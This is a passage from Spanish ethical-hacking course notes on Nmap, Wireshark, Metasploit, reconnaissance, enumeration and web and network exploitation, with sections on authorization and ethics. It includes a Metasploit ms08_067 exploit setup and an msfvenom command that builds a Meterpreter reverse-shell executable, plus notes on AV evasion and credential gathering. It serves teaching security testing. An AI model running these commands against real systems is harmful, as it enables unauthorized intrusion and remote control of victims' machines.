`-p 22,80,443 o -p 1-65535`

Escaneo de scripts NSE (Nmap Scripting Engine):
`--script o --script vuln,default`

Escaneo agresivo (combina varios checks):
`-A (equiv. a -sV -O --traceroute --script=default)`


Nmap Scripting Engine (NSE)

Permite ejecutar scripts Lua para tareas como:

Detección de vulnerabilidades `(--script vuln)`
Fuerza bruta de servicios `(--script brute)`
Enumeración `(smb-enum-users, http-enum)`

Ejemplo:

```
nmap -sV --script=vuln -p 80,443 target.com
```

##### Interpretación de resultados clave

`Estado de puerto`:
open, closed, filtered, unfiltered, open|filtered, closed|filtered.

`Servicios identificados`:
nombre del servicio y versión (p. ej., ssh OpenSSH 7.6p1).

`Confianza de OS detection`:
Nmap muestra probabilidad y huellas;
no siempre es exacto.

`Tiempos y paquetes enviados`:
útiles para medir impacto del escaneo


##### Buenas prácticas

1. Obtener autorización explícita antes de escanear cualquier red/sistema.

2. Preferir escaneos no destructivos y documentar ventanas de mantenimiento.

3. Usar -T agresividad apropiada para no interrumpir servicios.

4. Registrar y almacenar salidas (-oA) y evidencias con timestamps.

5. Revertir cambios y limpiar artefactos si se generan
(por ejemplo, cuentas o payloads usados durante pruebas).


##### Ejemplos de comandos comunes (laboratorio)

Escaneo rápido y listado de hosts:
`nmap -sn 192.168.56.0/24`

Escaneo de puertos comunes + detección de versión:
`nmap -sS -sV -p 1-1000 192.168.56.101`

Escaneo con scripts de vulnerabilidad en puertos web:
`nmap -p 80,443 --script vuln 192.168.56.101`

Escaneo completo y guardar resultados:
`nmap -A -p- -oA scan_complete 192.168.56.101`



##### Limitaciones y consideraciones

Nmap puede ser detectado por IDS/IPS y generar ruido en la red.

Detección de versiones/OS no siempre es 100% fiable.

Escaneos UDP y de servicios pueden ser lentos y producir falsos positivos/negativos.

###### No sustituye pruebas manuales: usar Nmap como punto de partida y validar hallazgos
    

Recursos prácticos

##### Practica en entornos controlados (VMs vulnerables).

##### Revisar scripts NSE disponibles y crear scripts personalizados si hace falta.

###### Combinar Nmap con otras herramientas: masscan (escaneo masivo rápido), nmap para profundizar.



#### 2. Wireshark

##### Analizador de paquetes (packet analyzer) de código abierto que captura y muestra tráfico de red en detalle para inspección, diagnóstico y análisis forense de red

Pentesting:

1. Reconstruir sesiones/protocolos (HTTP, TLS, SMB, DNS).
2. Detectar credenciales en texto plano o información sensible filtrada.
3. Analizar patrones de comunicación para identificar servicios y anomalías.
4. Generar evidencia para reportes y reproducir ataques de red


Modo de captura y consideraciones:

1. Captura en vivo desde interfaces de red o lectura de archivos pcap/pcapng.
2. Permisos: requiere privilegios para capturar tráfico en muchas plataformas; usar con precaución.
3. Tamaño y filtros: limitar captura con BPF (tcpdump-style) para evitar archivos enormes.

Ejemplo BPF:
`port 80 or host 192.168.1.10`

4. Snaplen y ring buffers: ajustar snapshot length y rotación de archivos para manejar grandes volúmenes


Filtros: captura vs visualización:

1. Filtros de captura (libpcap/BPF): aplicados al recoger paquetes;
reducen datos grabados.
Ejemplo:
`tcp port 443`

2. Filtros de visualización (Wireshark display filters): aplicados a lo ya capturado; permiten búsquedas complejas.
Ejemplo:
`http.request.method == "POST" && ip.addr == 10.0.0.5`


Análisis de protocolos comunes

1. `HTTP`:
reconstruir solicitudes/respuestas, ver parámetros de formularios y cabeceras;
detectar datos sensibles en body o cookies no seguras.

2. `TLS/HTTPS`: si se tiene la clave privada o registros TLS (pre-master secrets),
Wireshark puede decifrar sesiones para análisis; de otro modo solo verás handshakes y metadatos.

3. `DNS`:
ver consultas y respuestas, detectar tunneling DNS o exfiltración.

4. `SMB/NetBIOS`:
inspeccionar transferencias de archivos, credenciales (en tráfico no cifrado) y shares expuestos.

5. `ARP/ICMP/TCP`:
útil para detectar escaneos, spoofing, traceroutes y latencia


##### Herramientas y funciones útiles

1. `Follow TCP/HTTP stream`:
reconstruye la conversación completa entre cliente y servidor.

2. `Expert Information`:
resumen de anomalías, retransmisiones, resecuencias y errores.

3. `Protocol Hierarchy Statistics / IO Graphs:
análisis cuantitativo del tráfico por protocolo y visualización temporal.

4. `Name resolution`:
resolver direcciones (desactivar en análisis público si no quieres consultas DNS adicionales).

5. `Decryption`:
usar (1) claves privadas para RSA (limitado para TLS modernas),
o (2) TLS pre-master-secret log (SSLKEYLOGFILE) desde navegador para descifrado de sesiones TLS en pruebas controladas.

6. `Export objects`:
extraer archivos transferidos por protocolos (HTTP, SMB, TFTP).

    
##### Casos de uso prácticos en un laboratorio de Hacking Ético

###### Capturar un ataque de fuerza bruta sobre SSH:
identificar intentos, IPs de origen, ritmo y patrones temporales.

###### Analizar un exploit web:
seguir la stream HTTP para ver payloads y respuestas.

###### Detectar exfiltración por DNS:
filtrar queries inusuales, tamaños y frecuencias.

###### Verificar que una mitigación:
(p. ej., HSTS o TLS) está activa observando cabeceras y handshakes


##### Prácticas y ética

1. Capturar solo en redes donde tengas autorización.

2. Anotar timestamps y contexto para cada captura;
correlacionar con otros logs (servidores, IDS).

3. Evitar almacenar tráfico con datos sensibles fuera de entornos seguros;
anonimizar cuando sea posible.

4. Limpiar y borrar capturas una vez completado el ejercicio si contienen datos personales reales


##### Limitaciones

No puede descifrar TLS sin claves o registros adecuados en la mayoría de las implementaciones modernas (ECDHE).

Capturas en redes con switching requieren técnicas
(port mirroring/SPAN, ARP spoofing
—esta última sólo en entornos controlados y con permiso).

Grandes volúmenes de datos pueden ser difíciles de manejar;
filtrar y segmentar capturas    


##### Comandos y ejemplos rápidos (conceptuales)

1. Captura con tcpdump para luego analizar en Wireshark:
`tcpdump -i eth0 -w captura.pcap host 192.168.56.101 and port 80`

2. Filtro de visualización en Wireshark para ver solo tráfico HTTP POST:
`http.request.method == "POST"`

3. Seguir flujo TCP en GUI:
click derecho sobre paquete → Follow → TCP Stream


Recursos prácticos

1. Practicar en lab: capturar tráfico entre Kali y VMs vulnerables (HTTP, DNS, SMB).

2. Generar SSLKEYLOGFILE en navegador para descifrar TLS en pruebas locales.

3. Usar funciones de export para extraer PoC y evidencias para informes.


#### 3. Metasploit

##### Framework modular para desarrollo y ejecución de exploits, payloads y tareas de post‑explotación en entornos controlados

Pentesting:

Validar vulnerabilidades con PoC controlados.
Obtener acceso remoto (shells, Meterpreter) y realizar recolección de evidencias.
Automatizar tareas de explotación, enumeración y post‑explotación.
Evaluar detección/mitigaciones (IDS/AV) en laboratorio

Componentes:

1. `msfconsole`:
interfaz principal (CLI) para interactuar con módulos y sesiones.

2. `msfvenom`:
generador de payloads/binaries (exe, elf, apk, etc.).

3. Módulos:

`exploit/*` — explotan vulnerabilidades específicas.

`auxiliary/*` — scanners, fuzzers, enumeración (no destructivos).

`post/*` — acciones post‑explotación (dump hashes, escalada, persistencia).

`payload/*` — payloads (reverse, bind, Meterpreter).

4. `Metasploit DB (Postgres)`:
almacena hosts, servicios y resultados (integración con Nmap).

5. `Meterpreter`:
payload avanzado en memoria con comandos para movimiento lateral, recolección y control


Tipos de payloads y comportamientos:

`Reverse shell`:
la víctima se conecta al atacante (útil para atravesar firewalls).

`Bind shell`:
la víctima escucha y el atacante se conecta.

`Staged vs stageless`:
staged usa stager que carga el payload; stageless es único binario.

`Meterpreter vs shell tradicional`:
Meterpreter opera en memoria y ofrece módulos de post‑explotación ricos


##### Flujo de trabajo:

1. Reconocimiento: importar resultados Nmap o registrar hosts

2. Selección de exploit: search / show info.

3. Configurar opciones: set RHOSTS, RPORT, LHOST, LPORT, PAYLOAD, TARGET, etc.

4. Ejecutar: exploit / run; gestionar sesiones (sessions -i).

5. Post‑explotación: usar módulos post/* o comandos Meterpreter.

6. Limpieza: eliminar persistencia, restaurar snapshots y documentar.


Funciones y módulos útiles:

`auxiliary/scanner/*` para enumeración (ssh, smb, http).
`exploit/*` para validar CVEs conocidos.
`post/multi/gather` para recolectar credenciales y datos del sistema.
`msfvenom` para empaquetar payloads en binarios y evadir firmwares/AV (en pruebas controladas).

Integración con otras herramientas

`Nmap`:
importar escaneos (-oX → db_import).

`Burp Suite, Wireshark:`
para análisis web y captures que apoyen explotación.

`Pivoting`:
usar Meterpreter para port‑forwarding y socks proxy para acceso a redes internas


##### Buenas prácticas y ética:

Obtener autorización explícita antes de cualquier prueba.

Probar primero en entornos controlados (VMs vulnerables); usar snapshots.

Preferir pruebas no destructivas; registrar timestamps, comandos y outputs (-oA/exports).

No dejar puertas traseras ni persistencia fuera del alcance autorizado; documentar y limpiar

    
##### Limitaciones y riesgos

Algunos exploits pueden provocar estabilidad o pérdida de datos; probar en laboratorio.

AV/EDR detectan muchos payloads; Meterpreter puede ser bloqueado o generar alertas.

Resultados deben validarse manualmente; no confiar sólo en explotación automática


Comandos básicos (ejemplos)

1. Iniciar consola:
`msfconsole`

2. Buscar módulo:
`search ms08_067`

3. Usar módulo y ver opciones:
`use exploit/windows/smb/ms08_067_netapi`
`show options`

4. Configurar y ejecutar:
`set RHOSTS 192.168.56.101`
`set LHOST 192.168.56.*`
`set PAYLOAD windows/meterpreter/reverse_tcp`
`exploit`
	
5. Generar payload:
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe -o shell.exe`


##### Prácticas recomendadas en laboratorio

1. Flujo:
`Nmap → identificar versión → investigar exploit → validar manualmente → Metasploit si procede → post‑explotación documentada`

2. Usar módulos auxiliary para reducir ruido antes de explotar.

3. Registrar y exportar evidencias para informes

## Reconocimiento Pasivo

Recopilación de información sobre un objetivo sin interactuar directamente con sus sistemas
evita generar tráfico detectable hacia el objetivo.

Objetivos:

1. `Construir un perfil del objetivo`
(dominios, subdominios, IPs, estructura organizativa, empleados, tecnologías usadas).

2. `Encontrar superficie de ataque potencial`
sin alertar IDS/administradores.

3. `Recolectar evidencia y contexto para planear fases activas posteriores`


### Fuentes y métodos comunes

1. WHOIS y registros DNS:
registrar propietarios, fechas, servidores de nombres, TTLs, historial de DNS (archivos históricos).

2. Búsqueda de subdominios:
certificados públicos (Certificate Transparency), motores de búsqueda, repositorios públicos.

3. Motores de búsqueda (Google, Bing)
operadores avanzados (dorks) y caches.

4. Redes sociales y perfiles profesionales:
LinkedIn, Twitter, GitHub (credenciales expuestas, repositorios, archivos de configuración).

5. Archivos públicos y documentos:
PDFs/Office indexados que pueden contener correos, rutas internas o versiones de software.

6. Shodan/Censys/Fingerprinting de Internet:
servicios expuestos, banners, versiones (sin hacer probe directo al objetivo si no es permitido; usar consultas públicas).

7. Certificate Transparency logs y crt.sh
para encontrar subdominios y certificados.

8. Archivos en repositorios públicos:
tokens, claves, secretos expuestos en GitHub/GitLab (buscar commits, historial).

9. Bases de datos de breaches y paste sites
(Have I Been Pwned, Pastebin) para correos o credenciales (solo leer públicamente disponibles).

10. DNS zone transfers públicas (AXFR) —
rara vez permitida, pero si existe puede revelar toda la zona;
aun así es pasivo si no se hace probe directo desde tu red local a sus DNS?
(nota: AXFR implica conexión directa; preferir fuentes públicas primarias).

11. Wayback Machine y caches para ver versiones históricas de sitios y posibles endpoints antiguos


### Herramientas

1. theHarvester, amass (modo passive),
subfinder, assetfinder (configurar para fuentes pasivas).

2. crt.sh, Censys, Shodan (consultas públicas),
SecurityTrails.

3. GitHub search, GitLeaks (solo para tus repositorios/permiso).

4. Buscar en motores y dorks manualmente.

5. APIs públicas (VirusTotal, HaveIBeenPwned, crt.sh)
para consultas automatizadas

    
### Salida esperada (deliverables)

1. Inventario inicial de activos:
dominios, subdominios, direcciones IP públicas, proveedores cloud, CDN.

2. Lista de correos y patrones de correo corporativo.

3. Tecnologías y versiones expuestas públicamente
(frameworks, servidores, librerías).

4. Posibles credenciales/secretos públicos encontrados
(documentar con cuidado y notificar responsable si aplicable).

5. Riesgos y oportunidades:
endpoints antiguos, subdominios olvidados, certificados expirados, expiración de dominios


### Buenas prácticas y ética

1. No realizar probes activos
(ping, escaneos, conexiones directas)
si el alcance no lo permite.

2. Registrar fuentes y timestamps;
guardar capturas y URLs públicas como evidencia.

3. No explotar ni acceder a datos sensibles descubiertos sin autorización;
reportar responsablemente.

4. Correlacionar hallazgos pasivos con pruebas activas solo cuando tengas permiso.

5. Respetar términos de servicio de plataformas y APIs;
usar rate limits y claves de API donde se requiera


### Limitaciones

Información incompleta o desactualizada.

Dependencia de fuentes públicas: algunas infraestructuras internas no aparecerán.

Riesgo de falsos positivos (subdominios caducados, certificados reusados).

No sustituye reconocimiento activo para confirmar estados reales de hosts/servicios

1. Consultar crt.sh y Certificate Transparency para subdominios.

4. Revisar perfiles públicos de empleados en LinkedIn para identificar nombres y roles.

5. Correlacionar tecnologías con fingerprints públicos (Wappalyzer/Netcraft) desde caches o metadata.

## Enumeración

##### Fase activa posterior al descubrimiento: interactuar con servicios identificados para recopilar información detallada (usuarios, recursos, rutas, versiones, configuraciones) que permita planear explotación o demostrar exposiciones

Objetivos:

1. Identificar cuentas, shares, rutas, endpoints, parámetros y estructuras internas.

2. Obtener datos útiles para explotación (usuarios, roles, nombres de máquinas, rutas administrativas).

3. Validar configuración y permisos que permitan movimiento lateral o escalada


### Ámbitos y tipos comunes

1. Servicios de red:
`SMB/Windows`: listar shares, usuarios, políticas de contraseña, información de dominio (enum4linux, smbclient, rpcclient).
`LDAP/Active Directory`: enumerar usuarios/grupos, GPOs, shares y objetos (ldapsearch, bloodhound para mapeo).
`NFS`: listar exports y montar (showmount, mount) en entornos de prueba.
`FTP`: listar directorios anónimos, archivos expuestos

2. Servicios web:
Enumeración de `rutas/endpoints (dirb/ffuf/dirbuster)`.
Enumeración de `parámetros y páginas administrativas, versiones y frameworks`.
Enumeración de `usuarios (password reset, usernames via endpoints, author pages)`.

3. Correo y autenticación:
`SMTP`: VRFY/EXPN cuando esté permitido, banner grab.
`IMAP/POP3`: enumeración de cuentas si el servicio lo permite

4. Base de datos:
Descubrir schemas, usuarios, roles y dumps accesibles (solo en scope).

5. DNS:
Enumerar registros (AXFR si permitido), subdominios, registros SRV (importante para AD)

6. Servicios de infraestructura:
`SNMP`: leer community strings públicas (snmpwalk), obtener config y credenciales.
`RDP/SSH`: enumeración de usuarios mediante banners, timing attacks, o response differences

7. Cloud/APIs:
Enumerar buckets S3 públicos, roles de IAM, endpoints expuestos, metadatos accesibles


### Herramientas representativas

1. SMB/AD:
enum4linux, smbclient, rpcclient, bloodhound, adfind, ldapsearch

2. Web:
ffuf, dirb, gobuster, Burp Suite intruder/repeater/scanner

3. DNS:
dig, dnsenum, fierce, host, amass (active enum).

4. SNMP:
snmpwalk, snmp-check


### Técnicas y consideraciones

1. `Banners y respuestas`:
usar banners para identificar versión/implementación antes de enumerar.

2. Validación manual:
confirmar resultados automatizados para evitar falsos positivos.

3. Rate limiting y lockouts:
cuidar no bloquear cuentas/servicios;
coordinar ventanas y límites.

4. Credenciales predeterminadas y listas:
probar credenciales por defecto permitidas en scope

5. Enumeración a través de APIs:
usar endpoints públicos autenticados/roles mal configurados

6. Saltos y pivoting:
usar información obtenida para acceder a otros recursos internos
(ej., cuentas encontradas → RDP/SMB).


### Indicadores útiles que buscar

##### 1. Cuentas con nombres de administrador, cuentas de servicio, nombres de máquinas con roles (DB, DC, FILE).

##### 2. Shares mal protegidos con permisos de escritura.

##### 3. Endpoints administrativos expuestos (/admin, /phpmyadmin, /wp-admin).

##### 4. Información sensible en archivos públicos (backups, config.php, .env).

##### 5. Políticas débiles: passwords cortos, falta de MFA, configuraciones SNMP públicas


Ética y límites

Solo enumerar dentro del alcance autorizado.

Evitar técnicas destructivas o que exfiltren datos reales sin permiso.

Documentar y conservar evidencia; notificar vulnerabilidades críticas según acuerdos del engagement
    

### Entregables típicos

##### 1. Lista de usuarios y grupos relevantes (con fuente y método de obtención).

##### 2. Shares, rutas y archivos sensibles encontrados.

##### 3. Endpoints y rutas web accesibles con parámetros potencialmente peligrosos.

##### 4. Pruebas/PoC de acceso (capturas, comandos) y recomendaciones (cerrar shares, endurecer permisos, deshabilitar servicios, aplicar MFA).


### Rs flujo práctico

1. Priorizar servicios detectados en el escaneo.

2. Ejecutar herramientas específicas (p. ej., enum4linux/smbclient para SMB).

3. Validar hallazgos manualmente (conectar a share, listar archivos).

4. Correlacionar usuarios encontrados con servicios (intentar acceso autorizado según scope).

5. Documentar evidencias y planificar explotación controlada si aplica

## Explotación de Vulnerabilidades

##### Acto controlado de aprovechar una debilidad identificada en un sistema para demostrar riesgo (PoC), obtener acceso o confirmar impacto, siempre con autorización


Objetivos:

##### 1. Verificar la existencia real de una vulnerabilidad.

##### 2. Evaluar el impacto (confidencialidad, integridad, disponibilidad).

##### 3. Obtener evidencia reproducible para reporte y remediación.

##### 4. Medir detección y respuesta (si está en scope).


Principios generales:

Autorización: solo en alcance y con permiso explícito.

Menor impacto: preferir técnicas no destructivas; evitar pérdida de datos o interrupciones.

Reversibilidad: usar snapshots/backups y limpiar cambios tras la prueba.

Documentación: registrar comandos, outputs, timestamps, PoC y mitigaciones.

Validación manual: no confiar únicamente en herramientas automáticas


### Tipos de exploit y vectores

##### 1. Remoto vs local: exploits que no requieren acceso previo vs los que necesitan ejecución local.

##### 2. Explotación de red (servicios expuestos) vs explotación de aplicación (web, APIs) vs explotación física/IoT.

##### 3. Exec code, RCE (remote code execution), command injection.

##### 4. Escalada de privilegios (local privilege escalation).

##### 5. Deserialización, buffer overflow, SQLi, XSS, SSRF, CSRF, authentication bypass.

##### 6. Lateral movement y pivoting (post‑explotación).


### Flujo típico de explotación ética

1. Validación previa: revisar hallazgos de reconocimiento/escaneo y evidencias
`(banners, versiones, CVE`).

2. Investigación: mapear vulnerabilidad
`(CVE, exploit-db, Metasploit, advisories)`
entender condiciones de explotación.

3. Prueba en laboratorio: replicar la vulnerabilidad en entorno controlado con la misma versión/configuración.

4. Prueba controlada en objetivo:
Usar exploit no destructivo o PoC que demuestre impacto mínimo.
Mantener conexión de control segura (reverse shell sobre puerto permitido).

5. Post‑explotación mínima: recopilar solo evidencia necesaria
`(logs, outputs, hashes)`
evitar extraer datos reales.

6. Limpieza: eliminar cuentas creadas, revertir cambios, restaurar snapshot si corresponde.

7. Reporte: PoC reproducible, pasos, riesgo, mitigación y verificación


### Herramientas y recursos comunes

`Exploit frameworks`:
Metasploit (modular), searchsploit/exploit-db.

`Fuzzers`:
 wfuzz, Burp Intruder, AFL (para binarios).

`Automatización`:
scripts personalizados (Python, PowerShell), msfvenom para payloads.

`Validación manual`:
curl, sqlmap (con control), netcat, debugging tools (gdb/Immunity Debugger) para exploits binarios.

`Sandboxes`:
laboratorios con VMs vulnerables (Metasploitable, Juice Shop) para pruebas previas


### Técnicas de seguridad y evasión (éticamente controladas)

#### Evasión de IDS/IPS y AV:
##### 1. ofuscación, stageless/staged payloads, encoding;
##### documentar la detección y no usar en producción sin scope.

Timing/rate control:
ajustar velocidad para reducir impacto.

Pivoting controlado:
ejecutar port-forwarding/SOCKS desde sesiones autorizadas para evaluar alcance interno


### Medición del riesgo

CVSS y contexto:
usar CVSS como guía, pero priorizar según activos, datos y probabilidad de explotación.

Impacto real:
exfiltración posible, acceso administrativo, interrupción de servicio.

Detección:
si la explotación dispara alertas, incluir en reporte para mejorar monitoreo


### Buenas prácticas técnicas

1. Reproducir primero en lab idéntico:
(misma versión/patch level).

2. Preferir PoC no persistente:
(shells en memoria como Meterpreter vs drop de binarios persistentes) si el scope lo permite.

3. Siempre obtener consentimiento para escalada,
fuerza bruta, pruebas de denegación de servicio o generación de tráfico elevado.

4. Controlar credenciales y artefactos:
no dejar credenciales en logs ni sistemas objetivo.

5. Segregar entorno atacante y objetivo
(redes aisladas, NAT/host‑only) para pruebas
    

### Riesgos y limitaciones

Exploits pueden provocar crashes, corrupción de datos o interrupciones.

Herramientas exploit públicas pueden ser inestables o contener backdoors.

Explotación sin seguimiento puede violar leyes o acuerdos contractuales


### Entregables esperados tras explotación

##### 1. Descripción y pasos reproducibles (comandos, módulos, configuraciones).

##### 2. Evidencia: capturas de pantalla, outputs, hashes, logs con timestamps.

##### 3. Alcance del impacto (privilegios obtenidos, acceso a datos, pivoting logrado).

##### 4. Recomendaciones técnicas priorizadas (parches, configuraciones, compensaciones).

##### 5. Plan de remediación y verificación post‑fix

### PoC

##### Demostración técnica reproducible que prueba la existencia y el potencial impacto de una vulnerabilidad sin necesidad de explotarla de forma completa o destructiva

Objetivos:

Confirmar que una vulnerabilidad es real.
Mostrar el impacto potencial (confidencialidad, integridad, disponibilidad) de forma controlada.
Proveer evidencia reproducible para que el equipo de remediación entienda y arregle el fallo.
Evaluar detección y respuesta sin causar daño innecesario
    
Características:

1. Reproducible: pasos claros, comandos y parámetros concretos.
2. Minimiza impacto: evita exfiltrar datos reales o causar interrupciones.
3. Conciso: muestra solo lo necesario para demostrar la vulnerabilidad.
4. Documentado: incluye contexto, precondiciones, evidencia y mitigaciones recomendadas.
5. Temporalmente acotado: indica timestamps y ambiente (versiones, configuraciones).

##### Tipos de PoC:

`Proof of Concept (demostración)`:
ejecuta la acción mínima necesaria
(p. ej., respuesta que revela versión vulnerable).

`Proof of Exploit (PoE)`:
demuestra explotación práctica
(p. ej., obtener shell) — usar solo si está permitido.

`Conceptual PoC`:
descripción técnica sin interacción con el objetivo
(útil cuando no se permite actividad activa).

`Safe/Non‑destructive PoC`:
técnicas como lectura de banner, error controlado o ejecución en entorno de prueba


### Estructura PoC:

Resumen breve: vulnerabilidad identificada (CVE si aplica) y riesgo.

Precondiciones: alcance, versiones, credenciales necesarias (si las hay).

Entorno de prueba: IPs/hosts de laboratorio o nota de que fue en entorno real con autorización.

Pasos reproducibles: comandos exactos, flags, payloads y orden de ejecución.

Evidencia: salidas relevantes, capturas de pantalla, logs con timestamps (sin exfiltrar datos sensibles).

Impacto observado: qué se consigue (p. ej., listado de usuarios, ejecución de comandos).

Mitigación recomendada: parches, configuraciones, controles compensatorios.

Limpieza: acciones realizadas para revertir cambios y conservar integridad del objetivo


Buenas prácticas éticas y técnicas

Obtener autorización explícita y ceñirse al scope.
Preferir PoC no destructivos; si se requiere PoE, avisar y coordinar.
No almacenar ni compartir datos sensibles descubiertos; redaccion en informes anonimizando datos reales cuando corresponda.
Usar entornos de laboratorio para validar PoC antes de ejecutarlo contra sistemas reales.
Incluir indicaciones sobre cómo replicar y verificar la corrección después del parche.


Ejemplos breves (conceptuales)

SQLi (safe PoC): petición HTTP que provoca un mensaje de error que revela la versión de DB; incluir curl exacto y respuesta parcial.
XSS (PoC seguro): mostrar payload reflejado en un parámetro que provoca ejecución JS en un contexto de prueba (usar entorno controlado).
RCE (PoC controlado): ejecutar comando harmless (p. ej., id) vía exploit y mostrar salida, evitando comandos que modifiquen datos.


Limitaciones

Un PoC demuestra posibilidad, no necesariamente explotabilidad completa en producción.
Algunos PoC pueden no ser admisibles públicamente (contienen datos sensibles); manejar con cadena de custodia.


Cuando entregar un PoC

Con el informe técnico del pentest.
Inmediatamente para vulnerabilidades críticas cuando el equipo de respuesta necesita contexto urgente.
Siempre junto con recomendaciones y pasos para verificación post‑fix


#### CVE

##### CVE (Common Vulnerabilities and Exposures) es un identificador único y estándar para vulnerabilidades publicadas: Facilita referencia, búsqueda y correlación entre fuentes y herramientas.
ej.: CVE-2021-34527

Estructura y significado:
Formato: CVE‑YYYY‑NNNNN (año de publicación + número secuencial).
Cada entrada CVE apunta a una descripción breve de la vulnerabilidad y referencias a advisories, parches y exploits

Fuentes y bases de datos:
NVD (National Vulnerability Database) añade metadatos: CVSS score, fechas, descripciones extendidas y referencias.
Otras fuentes: advisories de vendors, exploit-db, listas de seguridad, repositorios de parches.

Uso en pentesting:
Identificación: correlacionar banners/versiones/outputs con CVEs conocidos para priorizar riesgo.
Prioridad: usar CVSS (y contexto organizacional) para priorizar pruebas y mitigaciones.
Herramientas: scanners (Nessus/OpenVAS), Nmap NSE y gestores de vulnerabilidades usan CVE para reportes y remediación.
Investigación: buscar PoC/exploits asociados, mitigaciones oficiales y parches relacionados con el CVE.

Limitaciones y consideraciones:
Un CVE indica una vulnerabilidad conocida, pero no garantiza explotabilidad en un entorno concreto (configuración, mitigaciones, parches).
Fecha del CVE no siempre coincide con la fecha de descubrimiento; revisar fuentes adicionales para contexto.
Priorizar según activo y exposición: un CVE crítico en servidor interno poco accesible puede ser menos urgente que uno medio en un servicio público.

Buenas prácticas
Validar manualmente: confirmar que la versión/condición mencionada en el CVE aplica al objetivo antes de explotar.
Usar CVE + contexto: combinar CVSS con criticidad del activo y detección/mitigaciones existentes.
Mantener inventario: registrar CVEs detectados en el inventario de activos y su estado de remediación.
Monitorizar: suscribirse a feeds/advisories para CVEs relevantes en el stack

##### flujo práctico CVE

Escaneo detecta servicio y versión.
Buscar CVEs asociados a esa versión.
Revisar NVD/vendor advisory para impacto y exploitability.
Probar PoC en laboratorio; si aplica, validar en objetivo autorizado y reportar con CVE y mitigación



## Explotación de Aplicaciones Web

##### Identificar y validar vulnerabilidades en aplicaciones web para demostrar riesgo y recomendar mitigaciones, siempre con autorización

### Componentes Objetivo:

Cliente (navegador)
servidor web
aplicación (backend)
APIs
base de datos
almacenamiento
CDN
autenticación/SESIONES
componentes de terceros (librerías, plugins).

### Metodología general:

Recolección: mapa de endpoints, parámetros, métodos HTTP, autenticación, roles y tecnologías.
Enumeración: identificar páginas ocultas, directorios, versiones, parámetros y puntos de entrada.
Análisis: priorizar vectores por impacto y probabilidad.
Explotación controlada: PoC no destructivo o PoE con permiso.
Post‑explotación: evaluar impacto (data exposure, account takeover, pivoting) y detección.
Reporte: pasos reproducibles, evidencia y mitigaciones

### Principales vectores y vulnerabilidades (OWASP Top risks)

Injection (SQL, NoSQL, OS, LDAP): ejecución de comandos o consultas no sanitizadas.
Broken Authentication / Session Management: takeover de cuentas, sesión predecible.
Sensitive Data Exposure: datos en texto plano, malas configuraciones TLS.
XML External Entities (XXE): lectura de archivos locales/remotos.
Broken Access Control: escalada de privilegios, acceso a recursos ajenos.
Security Misconfiguration: paneles expuestos, debug habilitado, versiones visibles.
Cross‑Site Scripting (XSS): ejecución de JS en contexto del usuario.
Insecure Deserialization: ejecución arbitraria vía objetos mal deserializados.
Using Components with Known Vulnerabilities: librerías/plugins no parcheadas.
Insufficient Logging & Monitoring: falta de detección de ataques.

### Técnicas comunes de prueba

##### 1. Crawling y mapping: Burp Spider, wget, ffuf para rutas ocultas.
##### 2. Fuzzing de parámetros y endpoints: Burp Intruder, wfuzz, ffuf.
##### 3. Injection testing: sqlmap (con control), payloads manuales, prepared statements check.
##### 4. XSS testing: reflejado/almacenado y DOM XSS con varios contextos (HTML, attribute, JS, URL).
##### 5. Auth testing: brute force (solo si permitido), session fixation, token replay, credential stuffing.
##### 6. Access control: IDOR testing (insecure direct object references), force URL tampering, role switching.
##### 7. File upload: validar extensión, content‑type, path traversal y ejecución de archivos subidos.
##### 8. CSRF: token absence/weak tokens, predictable URLs.
##### 9. Business logic abuse: workflows mal validados, price manipulation, race conditions.
##### 10. API testing: parametrización, excessive data exposure, insecure CORS, auth flaws (OAuth/JWT misuse).
##### 11. Client‑side security: CSP, SRI, secure cookies, secure headers


### Herramientas clave

##### 1. Intercepting proxy: Burp Suite (Proxy, Repeater, Intruder, Scanner), OWASP ZAP.
##### 2. Crawlers/fuzzers: ffuf, wfuzz, dirb, gobuster.
##### 3. Automated scanners (uso cuidadoso): Nikto, Arachni, OWASP ZAP scanner.
##### 4. Exploit helpers: sqlmap, xsser (para XSS PoC), jwt_tool, jwt_decoder.
##### 5. Dev tools + browser plugins: Burp extension, Postman, browser console, SSLKEYLOGFILE para TLS debug


### Prácticas de explotación ética (PoC)

Preferir PoC no destructivos (leer un banner, error controlado, mostrar input reflejado).
Evitar exfiltrar datos reales; usar muestras o anonimizarlas.
Documentar pasos exactos (request/response, payloads, headers) y proveer mitigaciones.
Validar en laboratorio antes de ejecutar en producción


### Detección y evasión (controlado)

##### Ser consciente de logging/IDS: ajustar timing, evitar high‑volume fuzzing en producción.
##### Simular técnicas de evasión solo si está en scope (encoding, case mangling) y documentar detección


Medición del riesgo y priorización

Combinar OWASP/CVSS con contexto del negocio: sensibilidad de datos, alcance del acceso, exposición pública.
Priorizar vulnerabilidades explotables remotamente y que afectan cuentas administrativas o datos críticos


### Mitigaciones generales

##### 1. Input validation y output encoding (contextual).
##### 2. Uso de parámetros preparados/ORM para DB.
##### 3. Gestión sólida de sesiones: cookies seguras, expiración, rotación, MFA.
##### 4. Principle of least privilege en APIs y recursos.
##### 5. Actualización y gestión de dependencias (SBOM).
##### 6. Harden TLS, cabeceras de seguridad (CSP, HSTS, X-Frame-Options).
##### 7. Logging, alerting y pruebas periódicas (IAST/DAST/pen tests).

Entregables recomendados

Recomendaciones técnicas y pasos de verificación post‑fix.
Evidencia (requests/responses) sin exponer datos sensibles

## Explotación de Redes

##### Identificar y aprovechar debilidades en infraestructuras de red para evaluar exposición, impacto y capacidad de movimiento lateral, siempre con autorización


Componentes objetivo:

Dispositivos de borde (firewalls, routers)
switches
servidores
estaciones de trabajo
servicios de red (SSH, RDP, SMB, DNS, SNMP)
VPNs
VLANs
dispositivos IoT/OT.


### Fases generales:

##### 1. Reconocimiento (activo/pasivo): descubrir hosts, rangos IP, topología y dispositivos.
##### 2. Escaneo: puertos, servicios y versiones.
##### 3. Enumeración: usuarios, shares, rutas, configuraciones SNMP/DNS/LDAP.
##### 4. Explotación: uso de exploits, credenciales débiles, configuración incorrecta o fallos de autenticación.
##### 5. Post‑explotación y pivoting: escalada, movimiento lateral, recolección de credenciales y establecimiento de acceso.
##### 6. Remediación y reporte: entregar PoC, evidencia y recomendaciones


### Técnicas de descubrimiento y escaneo:

##### 1. Host discovery: ARP scan en LAN, ICMP, TCP SYN probe.
##### 2. Escaneo masivo: masscan para hallar grandes superficies; nmap para fingerprinting y scripts NSE.
##### 3. Escaneo UDP: detectar servicios como DNS, SNMP, NTP (más lento y ruidoso).
